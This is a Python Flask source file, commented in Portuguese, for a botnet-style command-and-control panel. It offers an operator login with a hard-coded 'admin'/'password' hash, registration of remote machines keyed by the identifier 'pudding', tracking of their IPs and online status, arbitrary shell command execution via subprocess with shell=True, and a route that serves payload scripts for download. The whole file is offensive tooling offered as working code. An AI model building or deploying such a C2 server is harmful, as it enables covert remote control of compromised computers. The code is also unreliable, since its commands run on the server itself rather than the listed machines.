from flask import Flask, request, redirect, url_for, session, render_template, send_from_directory
from datetime import datetime
import platform
import os
import subprocess
import hashlib

app = Flask(__name__)
app.secret_key = 'seu_seguro_chave_secreta'

# Dados de login estáticos para exemplo
users = {'admin': hashlib.sha256('password'.encode()).hexdigest()}  # Hashed password

# Lista de logs, máquinas ativas, offline e resultados de comandos
logs = []
active_machines = []
offline_machines = []
command_results = {}
log_file = 'logs.txt'
scripts_dir = 'templates/files'  # Diretório onde os scripts são armazenados

def read_logs():
    """Lê os logs do arquivo logs.txt."""
    if os.path.exists(log_file):
        with open(log_file, 'r') as file:
            return file.readlines()
    return []

def write_log(log_entry):
    """Escreve um novo log no arquivo logs.txt."""
    with open(log_file, 'a') as file:
        file.write(log_entry + '\n')

@app.route('/')
def index():
    if 'username' in session:
        return redirect(url_for('c2'))
    return redirect(url_for('login'))

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form['username']
        password = hashlib.sha256(request.form['password'].encode()).hexdigest()  # Hashing password
        if username in users and users[username] == password:
            session['username'] = username
            return redirect(url_for('c2'))
        return "Invalid credentials, please try again."
    return render_template('login.html')

@app.route('/c2', methods=['GET', 'POST'])
def c2():
    if 'username' not in session:
        return redirect(url_for('login'))
    
    if request.method == 'POST':
        machine = request.form['machine']
        command = request.form['command']
        log_entry = f"{machine}: {command} - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
        write_log(log_entry)
        logs.append(log_entry)
        result = execute_command(machine, command)
        command_results[machine] = result
        return redirect(url_for('c2'))
    
    logs.clear()
    logs.extend(read_logs())
    return render_template('c2.html', logs=logs, machines=active_machines, offline=offline_machines, command_results=command_results)

def execute_command(machine, command):
    """Executa um comando na máquina e retorna o resultado."""
    try:
        result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT).decode('utf-8')
    except subprocess.CalledProcessError as e:
        result = e.output.decode('utf-8')
    command_results[machine] = result
    return result

@app.route('/register', methods=['POST'])
def register():
    """Registra uma nova máquina no sistema."""
    identifier = request.form.get('identifier')
    ip = request.remote_addr
    os_name = platform.system()
    machine_info = f"{os_name} - {ip} - {identifier}"
    
    if identifier == 'pudding':
        if machine_info not in active_machines:
            active_machines.append(machine_info)
            print(f"New active machine: {machine_info}")
            write_log(f"Machine connected: {machine_info}")
        # If machine is already active, remove from offline list if present
        if machine_info in offline_machines:
            offline_machines.remove(machine_info)
            write_log(f"Machine reconnected: {machine_info}")
    return "Registered"

@app.route('/disconnect', methods=['POST'])
def disconnect():
    """Registra uma máquina desconectada do sistema."""
    identifier = request.form.get('identifier')
    ip = request.remote_addr
    os_name = platform.system()
    machine_info = f"{os_name} - {ip} - {identifier}"

    if machine_info in active_machines:
        active_machines.remove(machine_info)
        offline_machines.append(machine_info)
        write_log(f"Machine disconnected: {machine_info}")
        print(f"Machine disconnected: {machine_info}")
    return "Disconnected"

@app.route('/scripts', methods=['GET'])
def list_scripts():
    """Lista os scripts disponíveis para download."""
    if 'username' not in session:
        return redirect(url_for('login'))
    
    scripts = os.listdir(scripts_dir)
    return render_template('scripts.html', scripts=scripts)

@app.route('/download/<filename>', methods=['GET'])
def download_script(filename):
    """Serve um script para download."""
    if 'username' not in session:
        return redirect(url_for('login'))
    
    return send_from_directory(scripts_dir, filename)

@app.route('/logout')
def logout():
    """Desloga o usuário e redireciona para a página de login."""
    session.pop('username', None)
    return redirect(url_for('login'))

@app.route('/command_history', methods=['GET'])
def command_history():
    """Retorna o histórico de comandos executados."""
    if 'username' not in session:
        return redirect(url_for('login'))
    
    return render_template('command_history.html', logs=read_logs())

if __name__ == '__main__':
    if not os.path.exists(scripts_dir):
        os.makedirs(scripts_dir)
    app.run(debug=True, host='127.0.0.1', port=5051)